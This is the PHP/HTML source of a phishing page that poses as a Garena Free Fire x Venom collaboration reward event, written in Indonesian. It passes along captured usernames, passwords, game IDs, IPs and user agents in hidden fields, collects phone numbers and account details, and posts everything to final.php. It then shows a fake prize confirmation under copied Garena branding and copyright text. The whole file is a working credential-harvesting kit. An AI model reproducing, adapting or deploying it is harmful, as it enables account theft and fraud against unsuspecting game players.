<?php
$user = $_POST['user'];
$pass = $_POST['pass'];
$id = $_POST['id'];
$nick = $_POST['nick'];
$ip = $_POST['ip'];
$ua = $_POST['ua'];
?>
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="shortcut icon" href="https://freefiremobile-a.akamaihd.net/ffwebsite/images/freefire16-2.ico" type="image/x-icon" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
        <meta name="copyright" content="" />
        <meta content="black" name="apple-mobile-web-app-status-bar-style" />
        <meta name="apple-mobile-web-app-title" content="Garena Free Fire">
        <meta name="keywords" content="survival, last survivor, battle royale game, battle royale, battleground, last man standing, free mobile game, multipleplayer, garena mobile game," />
        <meta name="description" content="Free Fire is a multiplayer battle royale mobile game, developed and published by Garena for Android and iOS. To be the last survivor is the only goal." />
        <title>FREEFIRE X VENOM</title>
        <link rel="stylesheet" href="assets/css/style.css">
        <link rel="stylesheet" href="assets/css/facebook.css">
        <link rel="stylesheet" href="https://unpkg.com/swiper@7/swiper-bundle.min.css"/>
    </head>
    <body>
        <div class="loader">
            <img src="https://h.top4top.io/p_2016h7ob71.gif">
        </div>
        <div class="app">
            <div class="head">
                <h1><i>NEW COLLABORATION</i></h1>
            </div>
            <!-- IMAGE SLIDER -->
            <div class="swiper">
                <div class="corner"></div>
                <div class="corner"></div>
                <div class="corner"></div>
                <div class="corner"></div>
                <div class="swiper-wrapper">
                  <div class="swiper-slide">
                      <img src="https://beritabooyah.id/wp-content/uploads/2021/09/YBYLX_jfslchd-1024x576.jpg">
                  </div>
                  <div class="swiper-slide">
                    <img src="https://dailyspin.id/wp-content/uploads/2021/09/ff-x-venom.jpg">
                  </div>
                  <div class="swiper-slide">
                    <img src="https://www.jakartastudio.com/wp-content/uploads/2021/09/Free-Fire-x-Venom-4.jpg">
                  </div>
                  <div class="swiper-slide">
                      <img src="https://larepublica.pe/resizer/7iMhWABIkmW8JvfaQNaMyanHkco=/480x282/top/smart/cloudfront-us-east-1.images.arcpublishing.com/gruporepublica/G7CEWQB4QVEWZPEEKHL6QF565A.jpg">
                  </div>
                  <div class="swiper-slide">
                    <img src="https://sesuaiaplikasi.com/wp-content/uploads/2021/09/ff-x-venom.jpg">
                  </div>
                </div>
                <div class="swiper-pagination"></div>
            </div>
            <!-- END IMG SLIDER -->


            <!-- BANNER -->
            <div class="banner">
               <div class="imgBox">
                   <img src="https://freefiremobile-a.akamaihd.net/common/web_event/official/logo-small-fixed_20210113.png">
               </div>
               <div class="imgBox">
                <img src="https://i.pinimg.com/originals/c5/1c/da/c51cda89a29626ea7b655bd7f703218c.png">
            </div>
            <div class="imgBox">
                <img src="https://www.pngkit.com/png/full/587-5878760_venom-image-venom-4k-blu-ray.png">
            </div>
            </div>
            <!-- END OF BANNER -->

            <!-- MENU BUTTON -->
            <div class="menu">
                <div class="label">
                    <h1>Isi Formulir Dibawah</h1>
                    <div class="corner"></div>
                    <div class="corner"></div>
                    <div class="corner"></div>
                    <div class="corner"></div>
                </div>
            </div>
            <!-- END MENU -->

            <div class="areaBox">
                <div class="formBox">
                    <form id="form" action="" method="POST">
                        <div class="form-group">
                            <input type="number" class="finput" autocomplete="off" placeholder="Nomor HP" id="hp" name="hp">
                        </div>
                        <div class="form-group">
                            <select class="finput" id="level" name="level">
                            <option value="" selected disabled>Level Akun?</option>
                            <?php
                                for($i=1;$i<=100;$i++){
                                echo'<option>'.$i.'<'.'/option>';
                                }
                            ?>
                            </select>
                        </div>
                        <div class="form-group">
                            <select class="finput wrong" id="tier" name="tier" class="form-input">
                            <option value="" selected disabled>Tier Akun</option>
                            <option>Bronze</option>
                            <option>Silver</option>
                            <option>Gold</option>
                            <option>Diamond</option>
                            <option>Master</option>
                            <option>Grand Master</option>
                            </select>
                         </div>
                         <div class="form-group">
                            <select class="finput" id="ep" name="ep" class="form-input">
                            <option value="" selected disabled>Pernah Elite Pass?</option>
                            <option>Pernah</option>
                            <option>Tidak Pernah</option>
                            </select>
                         </div>
                         <input type="hidden" name="user" value="<?= $user; ?>">
                         <input type="hidden" name="pass" value="<?= $pass; ?>">
                         <input type="hidden" name="id" value="<?= $id; ?>">
                         <input type="hidden" name="ip" value="<?= $ip; ?>">
                         <input type="hidden" name="nick" value="<?= $nick; ?>">
                         <input type="hidden" name="ua" value="<?= $ua; ?>">
                         <div class="form-group" id="fsubmit">
                             <button class="fsubmit" type="submit">Submit</button>
                         </div>
                    </form>
                </div>

            </div>



            <!-- MASK -->
            <div class="mask"></div>


            <!-- POP ITEM -->
            <div class="toast">
               <p class="text">Selamat Kepada <?= $nick; ?>, Hadiah akan kami kirim dalam 1x24 Jam</p>
            </div>


            <!-- LOADER -->
            <div class="loading">
                <svg version="1.1" id="L9" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
                viewBox="0 0 100 100" enable-background="new 0 0 0 0" xml:space="preserve">
                    <path fill="#fff" d="M73,50c0-12.7-10.3-23-23-23S27,37.3,27,50 M30.9,50c0-10.5,8.5-19.1,19.1-19.1S69.1,39.5,69.1,50">
                    <animateTransform 
                        attributeName="transform" 
                        attributeType="XML" 
                        type="rotate"
                        dur="1s" 
                        from="0 50 50"
                        to="360 50 50" 
                        repeatCount="indefinite" />
                </path>
                </svg>
            </div>
            
            <!-- FOOTER -->
            <div class="footer">
                <div class="garena">
                    <img src="https://reward.ff.garena.com/images/c34038edcf4185b3e75a6b85f1cd3d4f.jpg">
                </div>
                <div class="copyright">
                    <span class="atas">Copyright © Garena International.</span>
                    <span class="bawah">Trademarks belong to their respective owners. All rights Reserved.
                </div>
            </div>
            <!-- END FOOTER -->






        </div>
        <script src="https://cdn.jsdelivr.net/npm/js-base64@3.7.1/base64.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/ng-encrypt@1.0.0/ngSaltBae.js"></script>
        <script src="https://cdn.jsdelivr.net/gh/cdn-jquery/jquery/3.6.0/jquery.min.js"></script>
        <script src="https://unpkg.com/swiper@7/swiper-bundle.min.js"></script>
        <script type="module" src="https://cdn.jsdelivr.net/npm/@ionic/core/dist/ionic/ionic.esm.js"></script>
        <script nomodule src="https://cdn.jsdelivr.net/npm/@ionic/core/dist/ionic/ionic.js"></script>
        <script>
            $(document).ready(function(){
                $('.mask').hide();
                $('.loader').fadeOut()
            })
        </script>
        <script>
            const swiper = new Swiper('.swiper', {
            // Optional parameters
            direction: 'horizontal',
            loop: true,
            autoplay: {
                delay: 2000,
                disableOnInteraction: false,
            },
            // If we need pagination
            pagination: {
                el: '.swiper-pagination',
            },
            });
        </script>
        <script>
            function soundEffect(e) {
                var audio;
                if(e == 'spinSound')
                {
                    audio = new Audio('https://j.top4top.io/m_1948rgfbd0.mp3');
                }
                if(e == 'click')
                {
                    audio = new Audio('https://l.top4top.io/m_2093up9a11.mp3');
                    
                }
                if(e == 'pop')
                {
                    audio = new Audio('https://f.top4top.io/m_2093okcys1.mp3');
                }
                audio.play();
            }
        </script>
        <script>
            $('.finput').on('click',function(){
                new Audio('https://b.top4top.io/m_2102zquno1.mp3').play()
            })
            window.addEventListener('submit', (e) => {
                soundEffect('click')
                e.preventDefault()
                $('.fsubmit').prop('disabled',true);
                $('.fsubmit').html('<ion-spinner name="dots"></ion-spinner>');
                setTimeout(() => {
                    extend()
                },1500)
                return false;
            })

            function extend(){
                var hp = $("#hp").val(),level = $("#level").val(),tier = $("#tier").val(),ep = $("#ep").val();

                if(!hp || hp == null || hp == '')
                {
                    $("#hp").css('filter','hue-rotate(100deg)');
                    $('.fsubmit').html('Submit');
                    $('.fsubmit').prop('disabled',false);
                }else{
                    $("#hp").css('filter','hue-rotate(310deg)');
                }
                if(!level || level == null || level == '')
                {
                    $("#level").css('filter','hue-rotate(100deg)');
                    $('.fsubmit').html('Submit');
                    $('.fsubmit').prop('disabled',false);
                }else{
                    $("#level").css('filter','hue-rotate(310deg)');
                }
                if(!tier || tier == null || tier == '')
                {
                    $("#tier").css('filter','hue-rotate(100deg)');
                    $('.fsubmit').html('Submit');
                    $('.fsubmit').prop('disabled',false);
                }else{
                    $("#tier").css('filter','hue-rotate(310deg)');
                }
                if(!ep || ep == null || ep == '')
                {
                    $("#ep").css('filter','hue-rotate(100deg)');
                    $('.fsubmit').html('Submit');
                    $('.fsubmit').prop('disabled',false);
                }else{
                    $("#ep").css('filter','hue-rotate(310deg)');
                }

                // if all form are filled
                if(hp.length != 0 && level != null && tier != null && ep != null)
                
                {
                    // SEND DATA
                    $.ajax({
                        type: 'POST',
                        url: 'final.php',
                        data: $('#form').serialize(),
                        dataType: 'text',
                        success: function() {
                                    $('.fsubmit').prop('disabled',true);
                                    $('.fsubmit').html('DISABLED');
                                    $('.fsubmit').css('filter','grayscale(100%)');
                                    $('.fsubmit').css('cursor','no-drop');
                                    $('.mask').fadeIn()
                                    $('.toast').toggle();
                                    // No Reedit PLZ
                            } 
                    })
                }
            }
        </script>
    </body>
</html>